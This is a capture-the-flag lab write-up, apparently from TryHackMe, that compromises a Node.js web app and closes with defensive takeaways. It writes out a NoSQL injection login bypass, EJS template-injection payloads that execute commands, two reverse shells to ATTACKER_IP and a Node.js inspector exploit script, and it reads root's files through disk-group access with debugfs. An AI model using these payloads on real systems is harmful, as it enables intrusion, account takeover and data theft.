Challenge Overview

Objective: Compromise the Byte Lotus poolside platform, escalate privileges through multiple service accounts, and recover both the user and root flags.

"Sign's on the door. Room's active. You have access you were never given, and so does he. The anomalies stop being anomalies: a session goes warm on a sunbed, and a stranger sits down in it, a wallet signs a transaction its owner didn't authorise, a shell on the beach answers back."

Attack Chain

Nmap Scan → NoSQL Injection → SSTI (EJS) → Reverse Shell → 🚩 User Flag → Node.js Inspector → Lateral Movement → Disk Group Privesc → 🚩 Root Flag

Methodology

STEP 1 Reconnaissance

I started with a targeted Nmap scan against the target to enumerate open ports and identify running services:

nmap -Pn -sC -sV -oN nmap/initial 10.49.133.250
  • -Pn — Skips host discovery (treats the host as online), useful since lab machines may not respond to ICMP pings.
  • -sC — Runs Nmap's default NSE scripts for additional enumeration (banner grabbing, version fingerprinting, etc.).
  • -sV — Probes open ports to determine the service and version running on each.
  • -oN nmap/initial — Saves output in normal format for later reference.
✓ Scan revealed a web server running on the target.

STEP 2 NoSQL Injection — Authentication Bypass

Navigating to the web application, I found a login page. Rather than attempting to brute-force credentials, I tested for NoSQL injection on the login form. The application appeared to be backed by a NoSQL database (likely MongoDB), which is susceptible to operator injection when user input isn't properly sanitized.

I crafted a request using the $ne (not equal) operator against the password field. This effectively tells the database: "log me in as attendant where the password is not equal to x" — a condition that is almost always true:

curl -i -s -c cookies.txt \
  --data 'username=attendant&password[$ne]=x' \
  http://10.49.133.250/login
  • -c cookies.txt — Saves the session cookie returned by the server upon successful authentication.
  • password[$ne]=x — The NoSQL injection payload. When parsed by a vulnerable backend (e.g., Express.js with body-parser), this becomes { password: { $ne: "x" } }, bypassing the password check entirely.
✓ Authentication bypassed — valid session cookie obtained as the "attendant" user.

STEP 3 Server-Side Template Injection (SSTI)

With an authenticated session, I explored the application and discovered a template preview feature at /staff/preview. I tested it for Server-Side Template Injection (SSTI) by submitting a simple EJS arithmetic expression:

curl -s -b cookies.txt \
  --data-urlencode 'template=<%=7*7%>' \
  http://10.49.133.250/staff/preview

The server responded with 49, confirming that user-supplied input is being rendered directly into a server-side EJS template engine without sanitization.

✓ SSTI confirmed — server evaluated <%=7*7%> and returned 49.

STEP 4 Remote Code Execution

I escalated the SSTI to achieve Remote Code Execution (RCE) by leveraging Node.js's child_process module through the global process object:

curl -s -b cookies.txt \
  --data-urlencode 'template=<%= global.process.mainModule.require("child_process").execSync("id").toString() %>' \
  http://10.49.133.250/staff/preview

This payload chains through the Node.js runtime:

  • global.process — Accesses the Node.js runtime's process handle.
  • mainModule.require() — Imports the child_process module.
  • execSync("id") — Synchronously executes the id system command.
  • .toString() — Converts the output buffer to a readable string.
✓ RCE confirmed — server returned the output of the id command.

STEP 5 Reverse Shell — User Flag

With confirmed RCE, I deployed a reverse shell to get an interactive session on the target. I set up a Netcat listener on my attacking machine:

nc -lvnp 4444

Then triggered the reverse shell through the SSTI vulnerability using a bash TCP redirect:

curl -s -b cookies.txt \
  --data-urlencode "template=<%= global.process.mainModule.require('child_process').exec(\"bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\") %>" \
  http://10.49.133.250/staff/preview

The payload spawns an interactive bash shell that redirects stdin, stdout, and stderr through a TCP connection back to my listener. I caught the connection and landed as the poolside service account:

connect to [ATTACKER_IP] from (UNKNOWN) [10.49.133.250] 39568

poolside@tryhackme-2404:/opt/poolside$ id
uid=996(poolside) gid=996(poolside) groups=996(poolside)

The user flag was located in the poolside user's home directory:

STEP 6 Lateral Movement — Node.js Inspector Debugger Abuse

With a foothold as poolside, I began enumerating for privilege escalation vectors. I checked for internal services listening on localhost:

ss -tlnp | grep 9229
LISTEN 0  511  127.0.0.1:9229  0.0.0.0:*

Port 9229 is the default port for the Node.js Inspector/Debugger protocol. I confirmed this by examining the running processes:

ps -ef | grep inspect
pipelinesvc  602  1  0 00:44 ?  00:00:00 /usr/bin/node --inspect=127.0.0.1:9229 processor.js

A second service account — pipelinesvc — was running a Node.js application with the --inspect flag enabled, exposing a Chrome DevTools debugging interface on localhost. This debugger allows arbitrary JavaScript evaluation in the context of the running process, effectively granting RCE as the pipelinesvc user.

I queried the debugger's JSON metadata endpoint to obtain the WebSocket URL:

curl http://127.0.0.1:9229/json
[{
  "description": "node.js instance",
  "id": "d56796e3-1fde-4b51-b760-eeaa74afa55c",
  "title": "processor.js",
  "type": "node",
  "url": "file:///opt/pipelinesvc/telemetry/processor.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/d56796e3-..."
}]

I then wrote an exploit script on the target that connects to the debugger via WebSocket and uses the Chrome DevTools Protocol Runtime.evaluate method to execute a reverse shell in the context of the pipelinesvc process:

cat > /tmp/pwn.js << 'EOF'
(async()=>{
  const t = await (await fetch("http://127.0.0.1:9229/json")).json();
  const ws = new WebSocket(
    t.find(x => x.webSocketDebuggerUrl).webSocketDebuggerUrl
  );
  const expr = `(function(){
    var n = process.mainModule.require("net"),
        c = process.mainModule.require("child_process"),
        s = c.spawn("/bin/bash",[]),
        k = new n.Socket();
    k.connect(4445,"ATTACKER_IP",function(){
      k.pipe(s.stdin);
      s.stdout.pipe(k);
      s.stderr.pipe(k);
    });
  })()`;
  ws.onopen = () => ws.send(JSON.stringify({
    id: 1,
    method: "Runtime.evaluate",
    params: { expression: expr }
  }));
  ws.onmessage = m => console.log(m.data);
})();
EOF

node /tmp/pwn.js

On my second Netcat listener (nc -lvnp 4445), I caught the connection as pipelinesvc:

connect to [ATTACKER_IP] from (UNKNOWN) [10.49.133.250] 49840
whoami
pipelinesvc
id
uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
✓ Lateral movement successful — now running as pipelinesvc with disk group membership.

STEP 7 Privilege Escalation — Raw Disk Access

The critical finding in the id output was that pipelinesvc is a member of the disk group (gid=6). This group grants raw read/write access to block devices, effectively allowing direct filesystem access that bypasses all file permission controls — including reading files owned by root.

I identified the root filesystem's underlying block device:

findmnt -no SOURCE /
/dev/nvme0n1p1

Then I used debugfs — an ext2/ext3/ext4 filesystem debugger — to read the root flag directly from the raw block device, completely bypassing file-level permissions:

debugfs -R "cat /root/root.txt" /dev/nvme0n1p1
ROOT FLAG

Key Takeaways

🔐 Sanitize NoSQL Queries

Never pass raw user input into database queries. Use parameterized queries or explicit type checking to prevent operator injection like $ne, $gt, and $regex. Libraries like mongo-sanitize can strip dollar-sign operators from user input.

🛑 Never Render User Input in Templates

Template engines should only process trusted, developer-defined templates. Allowing user-supplied content to be evaluated by an EJS, Jinja2, or similar engine leads directly to SSTI and full Remote Code Execution.

🐛 Disable Debugger Interfaces in Production

The Node.js --inspect flag should never be enabled on production or internet-facing systems. It provides unauthenticated code execution via the Chrome DevTools Protocol. Even when bound to localhost, any user on the same machine with network access can exploit it for lateral movement.

👥 Audit Group Memberships

The disk group grants raw block device access, which is equivalent to root-level file read/write. Service accounts should never be members of privileged groups like disk, adm, or docker unless absolutely necessary and carefully justified.
